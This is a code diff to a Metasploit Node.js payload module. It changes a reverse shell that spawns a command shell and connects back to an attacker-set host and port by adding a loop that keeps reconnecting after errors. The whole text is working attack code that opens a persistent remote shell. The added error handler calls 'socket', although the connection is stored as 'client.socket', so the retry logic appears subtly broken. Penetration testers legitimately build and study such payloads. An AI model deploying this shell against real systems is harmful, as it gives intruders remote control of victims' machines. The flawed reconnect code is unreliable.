@@ -56,16 +56,22 @@ module Msf::Payload::NodeJS
             util = require("util"),
             sh = cp.spawn(cmd, []);
         var client = this;
-        client.socket = net.connect(#{datastore['LPORT']}, "#{lhost}", #{tls_hash} function() {
-          client.socket.pipe(sh.stdin);
-          if (typeof util.pump === "undefined") {
-            sh.stdout.pipe(client.socket);
-            sh.stderr.pipe(client.socket);          
-          } else {
-            util.pump(sh.stdout, client.socket);
-            util.pump(sh.stderr, client.socket);
-          }
-        });
+	function StagerRepeat(){
+          client.socket = net.connect(#{datastore['LPORT']}, "#{lhost}", #{tls_hash} function() {
+            client.socket.pipe(sh.stdin);
+            if (typeof util.pump === "undefined") {
+              sh.stdout.pipe(client.socket);
+              sh.stderr.pipe(client.socket);          
+            } else {
+              util.pump(sh.stdout, client.socket);
+              util.pump(sh.stderr, client.socket);
+            }
+          });
+	  socket.on("error", function(error) {
+            StagerRepeat();
+          });
+      }
+      StagerRepeat();
       })();
     EOS
     cmd.gsub("\n",'').gsub(/\s+/,' ').gsub(/[']/, '\\\\\'')
